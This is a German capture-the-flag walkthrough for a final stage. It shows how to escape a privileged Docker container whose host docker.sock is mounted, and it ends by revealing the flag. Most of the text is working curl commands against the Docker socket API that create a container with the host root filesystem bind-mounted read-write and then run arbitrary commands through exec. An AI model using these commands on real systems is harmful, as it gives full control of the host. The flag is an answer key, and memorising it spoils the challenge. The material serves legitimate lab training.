# Stage 6: Container Escape & Host-Flag

## Ziel
Nutze eine im Compose freigeschaltete Lücke, um auf den Host zu entkommen und die letzte Flag zu lesen.

## Setup-Hinweis
Der Backend-Container wurde mit privilegierten Rechten und Mounts versehen:

```yaml
services:
  backend:
    privileged: true
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```
## Schritt-für-Schritt
Im Backend Container erstellst du einen neuen Container mit dem gesamten Host Daten:
```shell
curl --silent --unix-socket /var/run/docker.sock   -H "Content-Type: application/json"   -d '{
        "Image":      "alpine:latest",
        "Cmd":        ["sh","-c","sleep 1d"],
        "HostConfig": {"Binds":["/:/host:rw"]}
      }'   -X POST http://localhost/containers/create?name=ctf-escape \
    &&  \
curl --silent --unix-socket /var/run/docker.sock \
     -X POST http://localhost/containers/ctf-escape/start
   ```
Man kann dann das System untersuchen. Die Flag befindet sich im Root Verzeichnis des Hosts diese kann man so abrufen:
```shell
# 1) EXEC_ID holen (hier ["cat","/host/root/flag.txt"] für die Flag durch beliebige Befehel ersetzt werden)
EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["cat", "/host/root/flag.txt"]}' \
  -X POST http://localhost/containers/ctf-escape/exec \
  | sed -nr 's/.*"Id":"([^"]+)".*/\1/p')

# 2) den Exec-Call starten und den Output direkt ausgeben
curl --no-buffer --silent --unix-socket /var/run/docker.sock \
  -H "Connection: Upgrade" \
  -H "Upgrade: tcp" \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  -X POST http://localhost/exec/$EXEC_ID/start
```
Die finale Flag auf dem Host lautet:
`FLAG{root_flag_retrieved}`

Herzlichen Glückwunsch – du hast alle Stages gemeistert und die Challenge erfolgreich abgeschlossen!
